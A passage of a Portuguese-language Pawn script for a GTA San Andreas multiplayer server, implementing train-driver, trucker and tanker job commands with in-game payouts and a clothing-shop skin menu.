				{
					SendClientMessage(playerid, COR_AMARELO, "Vá até estação de San Fierro, ao chegar lá digite: /chegadasf");
					CargaEstacaoLS[playerid] = 1;
					CargaEstacaoLV[playerid] = 1;
					CargaEstacaoSF[playerid] = 0;
					return 1;
				}
				else
				{
				    SendClientMessage(playerid, COR_ERRO, "Você não está em um trem streak!");
				    return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COR_ERRO, "Você não é um(a) maquinista!");
				return 1;
			}
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está dentro da área vermelha!");
		    return 1;
		}
	}
	if(!strcmp(cmd, "/chegadasf", true))
	{
     	if(IsPlayerInDynamicCP(playerid, CP_11))
     	{
		    if(pInfo[playerid][Prof] == MAQUINISTA)
		    {
			    if(CargaEstacaoLS[playerid] == 0)
			    {
			        SendClientMessage(playerid, COR_ERRO, "Você não iniciou a saída de seu trem em Los Santos!");
			        return 1;
				}
 				if(CargaEstacaoLV[playerid] == 0)
			    {
			        SendClientMessage(playerid, COR_ERRO, "Você não iniciou a saída de seu trem em Las Ventura!");
			        return 1;
				}
 			    if(CargaEstacaoSF[playerid] == 1)
			    {
			        SendClientMessage(playerid, COR_ERRO, "Você já iniciou a saída de seu trem de San Fierro!");
			        return 1;
				}
		 		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 538)
				{
					SendClientMessage(playerid, COR_AMARELO, "Vá até estação de Los Santos, ao chegar lá digite: /chegadafinal");
					CargaEstacaoLS[playerid] = 1;
					CargaEstacaoLV[playerid] = 1;
					CargaEstacaoSF[playerid] = 1;
					return 1;
				}
				else
				{
				    SendClientMessage(playerid, COR_ERRO, "Você não está em um trem streak!");
				    return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COR_ERRO, "Você não é um(a) maquinista!");
				return 1;
			}
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está dentro da área vermelha!");
		    return 1;
		}
	}
	if(!strcmp(cmd, "/chegadafinal", true))
	{
     	if(IsPlayerInDynamicCP(playerid, CP_9))
     	{
		    if(pInfo[playerid][Prof] == MAQUINISTA)
		    {
			    if(CargaEstacaoLS[playerid] == 0)
			    {
			        SendClientMessage(playerid, COR_ERRO, "Você não iniciou a saída de seu trem em Los Santos!");
			        return 1;
				}
 				if(CargaEstacaoLV[playerid] == 0)
			    {
			        SendClientMessage(playerid, COR_ERRO, "Você não iniciou a saída de seu trem em Las Ventura!");
			        return 1;
				}
  				if(CargaEstacaoSF[playerid] == 0)
			    {
			        SendClientMessage(playerid, COR_ERRO, "Você não iniciou a saída de seu trem em San Fierro!");
			        return 1;
				}
		 		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 538)
				{
				    SendClientMessage(playerid, COR_AMARELO, "");
					SendClientMessage(playerid, COR_BRANCO,  " Você recebe R$1000 pelo serviço prestato.");
					SendClientMessage(playerid, COR_AMARELO, ")");
					CargaEstacaoLS[playerid] = 0;
					CargaEstacaoLV[playerid] = 0;
					CargaEstacaoSF[playerid] = 0;
					sGivePlayerCash(playerid, 1000);
					RemovePlayerFromVehicle(playerid);
					return 1;
				}
				else
				{
				    SendClientMessage(playerid, COR_ERRO, "Você não está em um trem streak!");
				    return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COR_ERRO, "Você não é um(a) maquinista!");
				return 1;
			}
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está dentro da área vermelha!");
		    return 1;
		}
	}
	if(!strcmp(cmd, "/carregar", true))
    {
		if(!IsPlayerInPlace(playerid, 2691.561, -2522.731, 2782.829, -2412.194))
  		{
			SendClientMessage(playerid, COR_ERRO, "Você não está na area de carregamento!");
			return 1;
   		}
        if(Carga[playerid] == 1)
		{
    		SendClientMessage(playerid, COR_ERRO, "Seu caminhão já está carregado!");
    		return 1;
		}
		if(Carregou[playerid] == 1)
		{
			SendClientMessage(playerid, COR_ERRO, "Aguarde 1 minuto e meio para carregar o seu caminhão novamente!");
		    return 1;
		}
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 514)
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está em um caminhão de cargas.");
		    return 1;
		}
		if(!IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está com uma carreta engatada!");
		    return 1;
		}
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
		{
			SendClientMessage(playerid, COR_ERRO, "Você deve estar dirigindo o caminhão para poder carregar!");
			return 1;
		}
		if(pInfo[playerid][Prof] != CAMINHONEIRO)
		{
			SendClientMessage(playerid, COR_ERRO, "Você não é Caminhoneiro!");
			return 1;
		}
		ShowPlayerDialog(playerid, D_CARGA, DIALOG_STYLE_LIST, "{FF0000}Entregas disponíveis", "\nInd. Solarion SF - {32CD32}R$1050\nWang Cars SF - {32CD32}R$1200\nMichelin Pneus LV - {32CD32}R$1300\nSprunk LS - {32CD32}R$950\nXoomer LS - {32CD32}R$950\nFlaischBerg LS - {32CD32}R$900\nRS Haul LS - {32CD32}R$800", "Carregar", "");
		return 1;
	}
	if(!strcmp(cmd, "/descarregar", true))
	{
		if(InDescargaSolarin[playerid] == false && InDescargaWangCars[playerid] == false && InDescargaMichelin[playerid] == false && InDescargaSprunk[playerid] == false &&
		InDescargaXoomer[playerid] == false && InDescargaFlaischberg[playerid] == false && InDescargaHaul[playerid] == false)
		{
		     SendClientMessage(playerid, COR_ERRO, "Você não está na area de descarregamento!");
		     return 1;
		}
		if(pInfo[playerid][Prof] != CAMINHONEIRO)
		{
			SendClientMessage(playerid, COR_ERRO, "Você não é um(a) caminhoneiro(a)!");
			return 1;
		}
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 514)
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está em um caminhão de cargas.");
		    return 1;
		}
		if(Carga[playerid] == 0)
		{
		    SendClientMessage(playerid, COR_ERRO, "Seu caminhão não está carregado!");
		    return 1;
		}
		if(Carregou[playerid] == 0)
		{
		   if(pCargo[playerid] < 20)
		   {
				if(InDescargaSolarin[playerid] == true) // 1
				{

					Carga[playerid] = 0;
					SendClientMessage(playerid, AZUL_WE, "Carreta descarregada com sucesso!");
					SendClientMessage(playerid, AZUL_WE, "A ' Industria Solarin ' lhe pagou R$1050 pelo serviço!");
					pCargo[playerid] += 1;
					if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
					{
					    SendClientMessage(playerid, -1, "Você entregou toda a carga e recebeu R$200 reais adicionais!");
						SetVehicleToRespawn(GetVehicleTrailer(GetPlayerVehicleID(playerid)));
						sGivePlayerCash(playerid, 1250);
				 	}
					else
					{
					    sGivePlayerCash(playerid, 1050);
					}
				}
				else if(InDescargaWangCars[playerid] == true)// 2
				{

					Carga[playerid] = 0;
					SendClientMessage(playerid, AZUL_WE, "Carreta descarregada com sucesso!");
					SendClientMessage(playerid, AZUL_WE, "A empresa ' Wang Cars ' lhe pagou R$1200 pelo serviço!");
					pCargo[playerid] += 1;
					if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
					{
					    SendClientMessage(playerid, -1, "Você entregou toda a carga e recebeu R$200 reais adicionais!");
						SetVehicleToRespawn(GetVehicleTrailer(GetPlayerVehicleID(playerid)));
						sGivePlayerCash(playerid, 1400);
					}
					else
					{
					    sGivePlayerCash(playerid, 1200);
					}
				}
				else if(InDescargaMichelin[playerid] == true)// 3
				{

					Carga[playerid] = 0;
					SendClientMessage(playerid, AZUL_WE, "Carreta descarregada com sucesso!");
					SendClientMessage(playerid, AZUL_WE, "A empresa ' Michelin Pneus ' lhe pagou R$1300 pelo serviço!");
					pCargo[playerid] += 1;
					if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
					{
					    SendClientMessage(playerid, -1, "Você entregou toda a carga e recebeu R$200 reais adicionais!");
						SetVehicleToRespawn(GetVehicleTrailer(GetPlayerVehicleID(playerid)));
						sGivePlayerCash(playerid, 1500);
					}
					else
					{
					    sGivePlayerCash(playerid, 1300);
					}
				}
				else if(InDescargaSprunk[playerid] == true)// 4
				{

					Carga[playerid] = 0;
					SendClientMessage(playerid, AZUL_WE, "Carreta descarregada com sucesso!");
					SendClientMessage(playerid, AZUL_WE, "A empresa ' Sprunk ' lhe pagou R$950 pelo serviço!");
					pCargo[playerid] += 1;
					if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
					{
					    SendClientMessage(playerid, -1, "Você entregou toda a carga e recebeu R$200 reais adicionais!");
						SetVehicleToRespawn(GetVehicleTrailer(GetPlayerVehicleID(playerid)));
						sGivePlayerCash(playerid, 1150);
					}
					else
					{
					    sGivePlayerCash(playerid, 950);
					}
				}
				else if(InDescargaXoomer[playerid] == true)// 5
				{

					Carga[playerid] = 0;
					SendClientMessage(playerid, AZUL_WE, "Carreta descarregada com sucesso!");
					SendClientMessage(playerid, AZUL_WE, "A empresa ' Xoomer ' lhe pagou R$950 pelo serviço!");
					pCargo[playerid] += 1;
					if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
					{
					    SendClientMessage(playerid, -1, "Você entregou toda a carga e recebeu R$200 reais adicionais!");
						SetVehicleToRespawn(GetVehicleTrailer(GetPlayerVehicleID(playerid)));
						sGivePlayerCash(playerid, 1150);
					}
					else
					{
					    sGivePlayerCash(playerid, 950);
					}
				}
				else if(InDescargaFlaischberg[playerid] == true)// 6
				{

					Carga[playerid] = 0;
					SendClientMessage(playerid, AZUL_WE, "Carreta descarregada com sucesso!");
					SendClientMessage(playerid, AZUL_WE, "A empresa ' FlaischBerg ' lhe pagou R$900 pelo serviço!");
					pCargo[playerid] += 1;
					if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
					{
					    SendClientMessage(playerid, -1, "Você entregou toda a carga e recebeu R$200 reais adicionais!");
						SetVehicleToRespawn(GetVehicleTrailer(GetPlayerVehicleID(playerid)));
						sGivePlayerCash(playerid, 1100);
					}
					else
					{
					    sGivePlayerCash(playerid, 900);
					}
				}
				else if(InDescargaHaul[playerid] == true)// 8
				{

					Carga[playerid] = 0;
					SendClientMessage(playerid, AZUL_WE, "Carreta descarregada com sucesso!");
					SendClientMessage(playerid, AZUL_WE, "A empresa ' RS Haul ' lhe pagou R$800 pelo serviço!");
					pCargo[playerid] += 1;
					if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
					{
		                SendClientMessage(playerid, -1, "Você entregou toda a carga e recebeu R$200 reais adicionais!");
						SetVehicleToRespawn(GetVehicleTrailer(GetPlayerVehicleID(playerid)));
						sGivePlayerCash(playerid, 1000);
     				}
					else
					{
					    sGivePlayerCash(playerid, 800);
					}
				}
				RemovePlayerMapIcon(playerid, 90);
			}
			else if(pCargo[playerid] > 75 && pCargo[playerid] < 200)
		    {
				if(InDescargaSolarin[playerid] == true) // 1
				{

					Carga[playerid] = 0;
					SendClientMessage(playerid, AZUL_WE, "Carreta descarregada com sucesso!");
					SendClientMessage(playerid, AZUL_WE, "A ' Industria Solarin ' lhe pagou R$1050 pelo serviço!");
					SendClientMessage(playerid, AZUL_WE, "Você é intermediário e recebe um bônus de R$200 reais!");
					pCargo[playerid] += 1;
					if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
					{
					    SendClientMessage(playerid, -1, "Você entregou toda a carga e recebeu R$200 reais adicionais!");
						SetVehicleToRespawn(GetVehicleTrailer(GetPlayerVehicleID(playerid)));
						sGivePlayerCash(playerid, 1450);
				 	}
					else
					{
					    sGivePlayerCash(playerid, 1250);
					}
				}
				else if(InDescargaWangCars[playerid] == true)// 2
				{

					Carga[playerid] = 0;
					SendClientMessage(playerid, AZUL_WE, "Carreta descarregada com sucesso!");
					SendClientMessage(playerid, AZUL_WE, "A empresa ' Wang Cars ' lhe pagou R$1200 pelo serviço!");
					SendClientMessage(playerid, AZUL_WE, "Você é intermediário e recebe um bônus de R$200 reais!");
					pCargo[playerid] += 1;
					if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
					{
					    SendClientMessage(playerid, -1, "Você entregou toda a carga e recebeu R$200 reais adicionais!");
						SetVehicleToRespawn(GetVehicleTrailer(GetPlayerVehicleID(playerid)));
						sGivePlayerCash(playerid, 1600);
					}
					else
					{
					    sGivePlayerCash(playerid, 1400);
					}
				}
				else if(InDescargaMichelin[playerid] == true)// 3
				{

					Carga[playerid] = 0;
					SendClientMessage(playerid, AZUL_WE, "Carreta descarregada com sucesso!");
					SendClientMessage(playerid, AZUL_WE, "A empresa ' Michelin Pneus ' lhe pagou R$1300 pelo serviço!");
					SendClientMessage(playerid, AZUL_WE, "Você é intermediário e recebe um bônus de R$200 reais!");
					pCargo[playerid] += 1;
					if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
					{
					    SendClientMessage(playerid, -1, "Você entregou toda a carga e recebeu R$200 reais adicionais!");
						SetVehicleToRespawn(GetVehicleTrailer(GetPlayerVehicleID(playerid)));
						sGivePlayerCash(playerid, 1700);
					}
					else
					{
					    sGivePlayerCash(playerid, 1500);
					}
				}
				else if(InDescargaSprunk[playerid] == true)// 4
				{

					Carga[playerid] = 0;
					SendClientMessage(playerid, AZUL_WE, "Carreta descarregada com sucesso!");
					SendClientMessage(playerid, AZUL_WE, "A empresa ' Sprunk ' lhe pagou R$950 pelo serviço!");
					SendClientMessage(playerid, AZUL_WE, "Você é intermediário e recebe um bônus de R$200 reais!");
					pCargo[playerid] += 1;
					if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
					{
					    SendClientMessage(playerid, -1, "Você entregou toda a carga e recebeu R$200 reais adicionais!");
						SetVehicleToRespawn(GetVehicleTrailer(GetPlayerVehicleID(playerid)));
						sGivePlayerCash(playerid, 1350);
					}
					else
					{
					    sGivePlayerCash(playerid, 1150);
					}
				}
				else if(InDescargaXoomer[playerid] == true)// 5
				{

					Carga[playerid] = 0;
					SendClientMessage(playerid, AZUL_WE, "Carreta descarregada com sucesso!");
					SendClientMessage(playerid, AZUL_WE, "A empresa ' Xoomer ' lhe pagou R$950 pelo serviço!");
					SendClientMessage(playerid, AZUL_WE, "Você é intermediário e recebe um bônus de R$200 reais!");
					pCargo[playerid] += 1;
					if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
					{
					    SendClientMessage(playerid, -1, "Você entregou toda a carga e recebeu R$200 reais adicionais!");
						SetVehicleToRespawn(GetVehicleTrailer(GetPlayerVehicleID(playerid)));
						sGivePlayerCash(playerid, 1350);
					}
					else
					{
					    sGivePlayerCash(playerid, 1150);
					}
				}
				else if(InDescargaFlaischberg[playerid] == true)// 6
				{

					Carga[playerid] = 0;
					SendClientMessage(playerid, AZUL_WE, "Carreta descarregada com sucesso!");
					SendClientMessage(playerid, AZUL_WE, "A empresa ' FlaischBerg ' lhe pagou R$900 pelo serviço!");
					SendClientMessage(playerid, AZUL_WE, "Você é intermediário e recebe um bônus de R$200 reais!");
					pCargo[playerid] += 1;
					if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
					{
					    SendClientMessage(playerid, -1, "Você entregou toda a carga e recebeu R$200 reais adicionais!");
						SetVehicleToRespawn(GetVehicleTrailer(GetPlayerVehicleID(playerid)));
						sGivePlayerCash(playerid, 1300);
					}
					else
					{
					    sGivePlayerCash(playerid, 1100);
					}
				}
				else if(InDescargaHaul[playerid] == true)// 8
				{

					Carga[playerid] = 0;
					SendClientMessage(playerid, AZUL_WE, "Carreta descarregada com sucesso!");
					SendClientMessage(playerid, AZUL_WE, "A empresa ' RS Haul ' lhe pagou R$800 pelo serviço!");
					SendClientMessage(playerid, AZUL_WE, "Você é intermediário e recebe um bônus de R$200 reais!");
					pCargo[playerid] += 1;
					if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
					{
		                SendClientMessage(playerid, -1, "Você entregou toda a carga e recebeu R$200 reais adicionais!");
						SetVehicleToRespawn(GetVehicleTrailer(GetPlayerVehicleID(playerid)));
						sGivePlayerCash(playerid, 1200);
     				}
					else
					{
					    sGivePlayerCash(playerid, 1000);
					}
				}
				RemovePlayerMapIcon(playerid, 90);
			}
			else if(pCargo[playerid] >= 200)
		    {
				if(InDescargaSolarin[playerid] == true) // 1
				{

					Carga[playerid] = 0;
					SendClientMessage(playerid, AZUL_WE, "Carreta descarregada com sucesso!");
					SendClientMessage(playerid, AZUL_WE, "A ' Industria Solarin ' lhe pagou R$1050 pelo serviço!");
					SendClientMessage(playerid, AZUL_WE, "Você é experiênte e recebe um bônus de R$350 reais!");
					pCargo[playerid] += 1;
					if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
					{
					    SendClientMessage(playerid, -1, "Você entregou toda a carga e recebeu R$200 reais adicionais!");
						SetVehicleToRespawn(GetVehicleTrailer(GetPlayerVehicleID(playerid)));
						sGivePlayerCash(playerid, 1600);
				 	}
					else
					{
					    sGivePlayerCash(playerid, 1400);
					}
				}
				else if(InDescargaWangCars[playerid] == true)// 2
				{

					Carga[playerid] = 0;
					SendClientMessage(playerid, AZUL_WE, "Carreta descarregada com sucesso!");
					SendClientMessage(playerid, AZUL_WE, "A empresa ' Wang Cars ' lhe pagou R$1200 pelo serviço!");
					SendClientMessage(playerid, AZUL_WE, "Você é experiênte e recebe um bônus de R$350 reais!");
					pCargo[playerid] += 1;
					if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
					{
					    SendClientMessage(playerid, -1, "Você entregou toda a carga e recebeu R$200 reais adicionais!");
						SetVehicleToRespawn(GetVehicleTrailer(GetPlayerVehicleID(playerid)));
						sGivePlayerCash(playerid, 1750);
					}
					else
					{
					    sGivePlayerCash(playerid, 1550);
					}
				}
				else if(InDescargaMichelin[playerid] == true)// 3
				{

					Carga[playerid] = 0;
					SendClientMessage(playerid, AZUL_WE, "Carreta descarregada com sucesso!");
					SendClientMessage(playerid, AZUL_WE, "A empresa ' Michelin Pneus ' lhe pagou R$1300 pelo serviço!");
					SendClientMessage(playerid, AZUL_WE, "Você é experiênte e recebe um bônus de R$350 reais!");
					pCargo[playerid] += 1;
					if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
					{
					    SendClientMessage(playerid, -1, "Você entregou toda a carga e recebeu R$200 reais adicionais!");
						SetVehicleToRespawn(GetVehicleTrailer(GetPlayerVehicleID(playerid)));
						sGivePlayerCash(playerid, 1850);
					}
					else
					{
					    sGivePlayerCash(playerid, 1650);
					}
				}
				else if(InDescargaSprunk[playerid] == true)// 4
				{

					Carga[playerid] = 0;
					SendClientMessage(playerid, AZUL_WE, "Carreta descarregada com sucesso!");
					SendClientMessage(playerid, AZUL_WE, "A empresa ' Sprunk ' lhe pagou R$950 pelo serviço!");
					SendClientMessage(playerid, AZUL_WE, "Você é experiênte e recebe um bônus de R$350 reais!");
					pCargo[playerid] += 1;
					if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
					{
					    SendClientMessage(playerid, -1, "Você entregou toda a carga e recebeu R$200 reais adicionais!");
						SetVehicleToRespawn(GetVehicleTrailer(GetPlayerVehicleID(playerid)));
						sGivePlayerCash(playerid, 1500);
					}
					else
					{
					    sGivePlayerCash(playerid, 1300);
					}
				}
				else if(InDescargaXoomer[playerid] == true)// 5
				{

					Carga[playerid] = 0;
					SendClientMessage(playerid, AZUL_WE, "Carreta descarregada com sucesso!");
					SendClientMessage(playerid, AZUL_WE, "A empresa ' Xoomer ' lhe pagou R$950 pelo serviço!");
					SendClientMessage(playerid, AZUL_WE, "Você é experiênte e recebe um bônus de R$350 reais!");
					pCargo[playerid] += 1;
					if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
					{
					    SendClientMessage(playerid, -1, "Você entregou toda a carga e recebeu R$200 reais adicionais!");
						SetVehicleToRespawn(GetVehicleTrailer(GetPlayerVehicleID(playerid)));
						sGivePlayerCash(playerid, 1500);
					}
					else
					{
					    sGivePlayerCash(playerid, 1300);
					}
				}
				else if(InDescargaFlaischberg[playerid] == true)// 6
				{

					Carga[playerid] = 0;
					SendClientMessage(playerid, AZUL_WE, "Carreta descarregada com sucesso!");
					SendClientMessage(playerid, AZUL_WE, "A empresa ' FlaischBerg ' lhe pagou R$900 pelo serviço!");
					SendClientMessage(playerid, AZUL_WE, "Você é experiênte e recebe um bônus de R$350 reais!");
					pCargo[playerid] += 1;
					if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
					{
					    SendClientMessage(playerid, -1, "Você entregou toda a carga e recebeu R$200 reais adicionais!");
						SetVehicleToRespawn(GetVehicleTrailer(GetPlayerVehicleID(playerid)));
						sGivePlayerCash(playerid, 1450);
					}
					else
					{
					    sGivePlayerCash(playerid, 1250);
					}
				}
				else if(InDescargaHaul[playerid] == true)// 8
				{

					Carga[playerid] = 0;
					SendClientMessage(playerid, AZUL_WE, "Carreta descarregada com sucesso!");
					SendClientMessage(playerid, AZUL_WE, "A empresa ' RS Haul ' lhe pagou R$800 pelo serviço!");
					SendClientMessage(playerid, AZUL_WE, "Você é experiênte e recebe um bônus de R$350 reais!");
					pCargo[playerid] += 1;
					if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
					{
		                SendClientMessage(playerid, -1, "Você entregou toda a carga e recebeu R$200 reais adicionais!");
						SetVehicleToRespawn(GetVehicleTrailer(GetPlayerVehicleID(playerid)));
						sGivePlayerCash(playerid, 1350);
     				}
					else
					{
					    sGivePlayerCash(playerid, 1150);
					}
				}
				RemovePlayerMapIcon(playerid, 90);
			}
		}
		else if(Carregou[playerid] == 1)
		{
			foreach(Player, a)
			{
				if(aInfo[a][Admin] == 1)
				{
					format(gStr, sizeof(gStr), "O(A) jogador(A) %s [ID: %d] entregou a carga muito rápidamente.", PlayerName(playerid), playerid);
					SendClientMessage(a, COR_ERRO, gStr);
					SendClientMessage(a, COR_BRANCO, "Verifique a situação, use '/Espiar'.");
				}
			}
			if(InDescargaSolarin[playerid] == true) // 1
			{

				Carga[playerid] = 0;
				SendClientMessage(playerid, 0xFFA4A4AA, "Carreta descarregada com sucesso!");
				SendClientMessage(playerid, 0xFFA4A4AA, " A ' Industria Solarin ' lhe pagou R$1050 pelo serviço!");
				GameTextForPlayer(playerid, "~y~~h~descarregado", 1000, 0);
				RemovePlayerMapIcon(playerid, 90);
			}
			else if(InDescargaWangCars[playerid] == true)// 2
			{

				Carga[playerid] = 0;
				SendClientMessage(playerid, 0xFFA4A4AA, "Carreta descarregada com sucesso!");
				SendClientMessage(playerid, 0xFFA4A4AA, "A empresa ' Wang Cars ' lhe pagou R$1200 pelo serviço!");
				GameTextForPlayer(playerid, "~y~~h~descarregado", 1000, 0);
				RemovePlayerMapIcon(playerid, 90);
			}
			else if(InDescargaMichelin[playerid] == true)// 3
			{

				Carga[playerid] = 0;
				SendClientMessage(playerid, 0xFFA4A4AA, "Carreta descarregada com sucesso!");
				SendClientMessage(playerid, 0xFFA4A4AA, "A empresa ' Michelin Pneus ' lhe pagou R$1300 pelo serviço!");
				GameTextForPlayer(playerid, "~y~~h~descarregado", 1000, 0);
				RemovePlayerMapIcon(playerid, 90);
			}
			else if(InDescargaSprunk[playerid] == true)// 4
			{

				Carga[playerid] = 0;
				SendClientMessage(playerid, 0xFFA4A4AA, "Carreta descarregada com sucesso!");
				SendClientMessage(playerid, 0xFFA4A4AA, "A empresa ' Sprunk ' lhe pagou R$950 pelo serviço!");
				GameTextForPlayer(playerid, "~y~~h~descarregado", 1000, 0);
				RemovePlayerMapIcon(playerid, 90);
			}
			else if(InDescargaXoomer[playerid] == true)// 5
			{

				Carga[playerid] = 0;
				SendClientMessage(playerid, 0xFFA4A4AA, "Carreta descarregada com sucesso!");
				SendClientMessage(playerid, 0xFFA4A4AA, "A empresa ' Xoomer ' lhe pagou R$950 pelo serviço!");
				GameTextForPlayer(playerid, "~y~~h~descarregado", 1000, 0);
				RemovePlayerMapIcon(playerid, 90);
			}
			else if(InDescargaFlaischberg[playerid] == true)// 6
			{

				Carga[playerid] = 0;
				SendClientMessage(playerid, 0xFFA4A4AA, "Carreta descarregada com sucesso!");
				SendClientMessage(playerid, 0xFFA4A4AA, "A empresa ' FlaischBerg ' lhe pagou R$900 pelo serviço!");
				GameTextForPlayer(playerid, "~y~~h~descarregado", 1000, 0);
				RemovePlayerMapIcon(playerid, 90);
			}
			else if(InDescargaHaul[playerid] == true)// 8
			{

				Carga[playerid] = 0;
				SendClientMessage(playerid, 0xFFA4A4AA, "Carreta descarregada com sucesso!");
				SendClientMessage(playerid, 0xFFA4A4AA, "A empresa ' RS Haul ' lhe pagou R$800 pelo serviço!");
				GameTextForPlayer(playerid, "~y~~h~descarregado", 1000, 0);
				RemovePlayerMapIcon(playerid, 90);
			}
		}
		return 1;
	}
	//Petroleiro
	if(!strcmp(cmd, "/pcarregar", true))
    {
        if(pInfo[playerid][Prof] == PETROLEIRO)
        {
			SendClientMessage(playerid, COR_ERRO, "Você não é um caminhoneiro");
			return 1;
		}
		if(!IsPlayerInPlace(playerid, -1035.8407, -626.9978, 32.5901, 359.9128))
  		{
			SendClientMessage(playerid, COR_ERRO, "Você não está no local de carregamento!");
			return 1;
   		}
        if(PCarga[playerid] == 1)
		{
    		SendClientMessage(playerid, COR_ERRO, "Você já carregou este caminhão de petróleo!");
    		return 1;
		}
		if(Carregado[playerid] == 1)
		{
			SendClientMessage(playerid, COR_ERRO, "Você deve esperar alguns segundos para poder carregar novamente!");
		    return 1;
		}
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
		{
			SendClientMessage(playerid, COR_ERRO, "Você deve estar dirigindo o caminhão para poder carregar!");
			return 1;
		}
		if(!IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
		{
		    SendClientMessage(playerid, COR_ERRO, "Você precisa engatar a carga!");
		    return 1;
		}
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 403)
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está em um caminhão de petróleo.");
		    return 1;
		}
		ShowPlayerDialog(playerid, D_PETROLEO, DIALOG_STYLE_LIST, "{FF0000}Postos de combustivel", "\nNOME - {32CD32}R$", "Carregar", "");
		return 1;
	}
	//petroleiro
	if(!strcmp(cmd, "/pdescarregar", true))
	{
		if(pInfo[playerid][Prof] != PETROLEIRO)
		{
			SendClientMessage(playerid, COR_ERRO, "Você precisa ser um(a) Petroleiro(a)!");
			return 1;
		}
	   	if(!PlayerToPoint( 10.0, playerid, 1940.6096,-1772.7147,12.9500) || !PlayerToPoint( 10.0, playerid, -90.8525,-1169.3555,1.9823) ||
		!PlayerToPoint( 10.0, playerid, -1607.8698,-2715.5637,48.9453) || !PlayerToPoint( 10.0, playerid, -2244.2200,-2560.6169,31.9219) ||
		!PlayerToPoint( 10.0, playerid, -2026.7922,156.5871,29.0391) || !PlayerToPoint( 10.0, playerid, -2410.0215,976.2697,45.4209) ||
		!PlayerToPoint( 10.0, playerid, -1328.4185,2675.4663,50.0625) || !PlayerToPoint( 10.0, playerid, 1596.2703,2198.8335,10.8203) ||
		!PlayerToPoint( 10.0, playerid, 2639.4871,1106.6412,10.8203) || !PlayerToPoint( 10.0, playerid, 2114.7256,920.3104,10.8203) ||
	 	!PlayerToPoint( 10.0, playerid, 1004.8821,-937.0840,42.3281) || !PlayerToPoint( 10.0, playerid, 1382.6870,459.7101,20.3452) ||
		!PlayerToPoint( 10.0, playerid, -1676.3906,412.9636,6.9068) || !PlayerToPoint( 10.0, playerid, 70.4693,1218.8176,18.5393) ||
	 	!PlayerToPoint( 20.0, playerid, 613.1774,1692.8209,7.1875) || !PlayerToPoint( 10.0, playerid, 2147.0969,2747.4377,10.5474) ||
	 	!PlayerToPoint( 10.0, playerid, 2202.2954,2474.0007,10.5474) || !PlayerToPoint( 10.0, playerid, 655.3937,-565.2368,15.9072))
		{
		     SendClientMessage(playerid, COR_ERRO, "Você não está em um posto de combustivel!");
		     return 1;
		}
		if(PCarga[playerid] == 0)
		{
		    SendClientMessage(playerid, COR_ERRO, "Seu caminhão de petróleo não está carregado!");
		    return 1;
		}
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 403)
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está em um caminhão de petróleo.");
		    return 1;
		}
	}
	if(!strcmp(cmd, "/skin", true))
	{
		if(pInfo[playerid][fardado] == 1 && aInfo[playerid][Admin] == 0)
		{
  			SendClientMessage(playerid, COR_ERRO, "Você está fardado(a)!");
   			SendClientMessage(playerid, COR_ERRO, "Você não pode trocar de skin fardado(a)!");
		    return 1;
		}
	    if(IsPlayerInDynamicCP(playerid, CP_5))
	    {
	        SendClientMessage(playerid, COR_AMARELO, "Bem-vindo(a) à loja de roupas {FFFFFF}Binco.");
	        ShowModelSelectionMenu(playerid, skins_binco, "Skins ~w~~h~Binco");
	    }
	    else if(IsPlayerInDynamicCP(playerid, CP_41))
	    {
	        SendClientMessage(playerid, COR_AMARELO, "Bem-vindo(a) à loja de roupas {FFFFFF}ZIP.");
	        ShowModelSelectionMenu(playerid, skins_zip, "Skins ~w~~h~ZIP");
	    }
	    else if(IsPlayerInDynamicCP(playerid, CP_42))
	    {
	        SendClientMessage(playerid, COR_AMARELO, "Bem-vindo(a) à loja de roupas {FFFFFF}VICTIM.");
	        ShowModelSelectionMenu(playerid, skins_victim, "Skins ~w~~h~Victim");
	    }
	    else if(IsPlayerInDynamicCP(playerid, CP_43))
	    {
	        SendClientMessage(playerid, COR_AMARELO, "Bem-vindo(a) à loja de roupas {FFFFFF}TRAINHARD e PROLAPS.");
	        ShowModelSelectionMenu(playerid, skins_prolaps, "~w~~h~Train Hard e Pro Laps");
	    }
